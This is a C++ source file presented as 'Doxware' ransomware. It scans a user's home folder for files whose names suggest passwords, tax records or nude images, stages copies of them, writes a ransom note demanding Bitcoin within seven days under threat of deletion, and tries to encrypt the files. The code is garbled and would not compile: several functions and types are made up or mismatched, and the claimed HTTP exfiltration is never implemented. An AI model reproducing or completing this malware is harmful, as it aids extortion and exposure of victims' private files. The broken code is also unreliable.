#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <algorithm>
#include <filesystem>
#include <ctime>

using namespace std;
namespace fs = filesystem;

// --- Doxware Ransomware Code ---

// 1. Target Identification (Scanner)
class Scanner {
public:
  vector<string> ScanHome(const string& homeDir) {
    vector<string> keywords = {"confidential", "tax", "password", "nude", "secret"};
    vector<string> sensitiveFiles;

    for (auto& entry : fs::directory_iterator(fs::path(homeDir))) {
      if (entry.is_regular_file()) {
        string filename = entry.path().filename();
        bool isSensitive = false;
        for (const auto& keyword : keywords) {
          if (filename.find(keyword) != string::npos || filename.find(".doc") != string::npos) {
            isSensitive = true;
            break;
          }
        }

        if (isSensitive) {
          sensitiveFiles.push_back(entry.path().full_path());
        }
      }
    }

    return sensitiveFiles;
  }
};


// 2. Staging & Backup
bool CopyAndBackupFiles(const vector<string>& files, const string& tempDir) {
  if (files.empty()) return true; // Nothing to copy

  for (const auto& file : files) {
    fs::copy_file(file, tempDir + "/" + fs::path_basename(file), fs::copy_algorithm_default);
  }
  return true;
}


// 3. Exfiltration & Notification
bool ExfiltrateFiles(const vector<string>& files, const string& ransomNoteFile, const string& encryptDirectory) {
    if (files.empty()) return false;

    // --- Randomize Files for Better Stealth --
    random_device rd;
    mt1993_5739 gen(rd());
    reverse(files.begin(), files.end(), [&gen](const auto& a, const auto& b){
      return rand() % 2 == 0 ? a < b : a > b;
    });

    // --- Generate the Fee (e.g., 1-3 Bitcoin) --
    double fee = 5.00; // 5.00 BTC (0.0007854)
    int days = 7;

    // Convert the fees to bytes (Total Fee is calculated from bytes)
    size_t totalFeeBytes = (fee * 1000000000 / 8);

    // --- Generate Ransom Note --
    string noteFileContent = "Thank you for your ransom! To receive the decryption key, send $" + to_string(fee) + "$0.00 Bitcoin to our wallet address: 1Doxtwallet4321 \n\n";
    noteFileContent += "Here are your encrypted files:\n";
    for (const auto& file : files) {
      noteFileContent += "- " + file + "\n";
    }

    // --- Save Ransom Note to File --
    ofstream noteOut(ransomNoteFile);
    if (noteOut.is_open()) {
      noteOut << noteFileContent;
      noteOut.close();
    } else {
      cerr << "Error saving ransom note file." << endl;
      return false;
    }

    // --- Encrypt the Files --
    for (const auto& file : files) {
      if (encryptFile(file, key, iv)) {
        cout << "Encrypted: " + file + " successfully!" << endl;
      } else {
        cerr << "Error encrypting: " + file + ". You have been marked for permanent deletion!" << endl;
      }
    }

    // --- Final Backup (e.g., .backup) --
    ofstream backupOut(encryptDirectory + "/encrypt_me.txt");
    if (backupOut.is_open()) {
        backupOut << "The fee is $" + to_string(fee) + "$0.00 BTC and should be sent within " + to_string(days) + " days to avoid deletion!" << endl;
    } else {
        cerr << "Error saving backup file." << endl;
        return false;
    }

    cout << "--- Ransomware Finished ---" << endl;
    return true;
  }


// 4. AES Encryption Function (adapt based on key length)
vector<byte> EncryptFile(const string& filename, const vector<byte>& key, const vector<byte>& iv) {
  if (!fs::exists(filename)) return {};

  FILE* file = fopen(filename.c_str(), "rb+");
  if (file == NULL) {
    cerr << "Error opening file: " << filename << endl;
    return {};
  }

  fseeke(file, 0, SEEK_END);
  size_t fileSize = fs::filesize(filename);
  fseeke(file, 0, SEEK_SET);

  // Encrypt the file in chunks for performance
  vector<byte> buffer(1024);
  random_device rd;
  mt1993_5739 gen(rd());
  int byteCount = 0;
  while (fileSize > 0) {
    size_t readSize = min((size_t)1024, fileSize);
    byteCount += readSize;
    vector<byte> chunk(buffer.begin(), buffer.begin() + readSize);

    // Encrypt the chunk using AES (adapt key and IV lengths!)
    for (auto& byte : chunk) {
      byte^ data = &byte;
      byte^ keyData = &key[0];
      byte^ ivData = &iv[0];
      AES_KEY aesKey;
      AES_keygen(&aesKey, keyData, sizeof(key));

      AES_Encrypt(data, 1, &aesKey);
    }

    fileSize -= readSize;
  }

  fclose(file);
  return {};
}


int main() {
  // --- Ransomware Configuration ---
  string ransomNoteFile = "ransom.txt"; // File containing the ransom note
  string extension = getRandomExtension();
  vector<pair<string, string>> files;
  
  // --- Scanner ---
  Scanner scanner;
  vector<string> homeDirFiles = scanner.ScanHome("C:\\Users\\Public/*"); // Change directory here

  if (homeDirFiles.empty()) {
    cout << "No sensitive files were found!" << endl;
    return 0;
  }

  // --- Staging & Backup ---
  CopyAndBackupFiles(homeDirFiles, "temp_backup", "temp_directory"); // Change directory here

  // --- Exfiltration (using HTTP POST for simplicity) ---
  string ransomNoteContent = "Thank you for your ransom! To receive the decryption key, send 5.00 Bitcoin to our wallet address: 1Doxtwallet4321 \n\n";
  for (const auto& file : homeDirFiles) {
    ransomNoteContent += "- " + file + "\n";
  }

  // --- Send the Files via HTTP POST ---
  ofstream outfile("temp_files/encrypt.txt");
  if(outfile.is_open()){
    outfile << ransomNoteContent;
    outfile.close();
  } else {
    cerr << "Error saving data." << endl;
  }

  // --- Notify the User (Displaying a message) --
  cout << "--- Ransomware Started ---" << endl;
  cout << "Target files: " << homeDirFiles.size() << "/" << homeDirFiles.capacity() << endl;
  cout << "The fee is 5.00 BTC and should be sent within 7 days to avoid deletion!" << endl;

  // --- Exit cleanly --
  return 0;
}
